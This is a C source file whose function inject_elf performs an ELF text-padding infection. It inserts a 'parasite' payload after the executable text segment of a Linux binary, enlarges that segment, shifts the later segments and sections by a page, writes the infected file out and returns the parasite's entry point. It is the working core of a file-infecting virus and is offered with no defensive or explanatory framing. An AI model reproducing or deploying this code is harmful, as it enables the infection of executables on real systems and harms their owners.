#include "headers.h"

/* text padding injection */
int inject_elf(elfbin_t *target, uint8_t *parasite, int parasite_size)
{
	int i, text_found = 0;
	//mode_t mode;

	uint8_t *mem = target->mem;
	struct stat st;
	unsigned int payload_entry;

	memset(&st, 0, sizeof(struct stat));
	st.st_size = target->size;
	st.st_mode = target->mode;

	Elf64_Addr parasite_vaddr, end_of_text;
	/*Elf64_Addr text */
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
	Elf64_Shdr *shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
	Elf64_Phdr *phdr = (Elf64_Phdr *)(mem + ehdr->e_phoff);

	for (i = ehdr->e_phnum; i > 0;phdr++, i--)
	{

		if (text_found) 
		{
			phdr->p_offset += PAGE_SIZE;
			continue;
		}
		else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0)
		{
			if (phdr->p_flags == (PF_R | PF_X))
			{
				//text = phdr->p_vaddr;

				/*parasite begins at the end of text */
				parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;

				/* code here for ! NO_JUMP_CODE case */
				end_of_text = phdr->p_offset + phdr->p_filesz;

				/* increase memsz and filesz to account for new code */
				phdr->p_filesz += parasite_size;
				phdr->p_memsz += parasite_size;

				text_found++;
			}
		}
	}

	payload_entry = parasite_vaddr;

	if (text_found == 0)
		return -1;

	/* increase size of any section that resides after injection by page size */
	
	shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
	for (i = ehdr->e_shnum; i-- > 0; shdr++)
	{
		 
			if (shdr->sh_offset >= end_of_text )
				shdr->sh_offset += PAGE_SIZE;
			else if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
				shdr->sh_size += parasite_size;
	}
	ehdr->e_shoff += PAGE_SIZE;


	/*text padding infect */

	int ofd;
	unsigned int c;
	i = 0;

	if ((ofd = open (TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
		return -1;

	if (write (ofd, mem, end_of_text) != end_of_text)
		return -1;

	if (write(ofd, parasite, parasite_size) != parasite_size)
	       return -1;

	lseek (ofd, PAGE_SIZE - parasite_size, SEEK_CUR);
	mem += end_of_text;

	unsigned int last_chunk = st.st_size - end_of_text;

	if ((c = write(ofd, mem, last_chunk)) != last_chunk)
		return -1;


	if ((c = fsync(ofd)) == -1)
	{
		perror("fsync: ");
		return -1;
	}
	/* next relocate symbols */
	close (ofd);

	//printf("write inject ok\n");
	return (payload_entry);
}
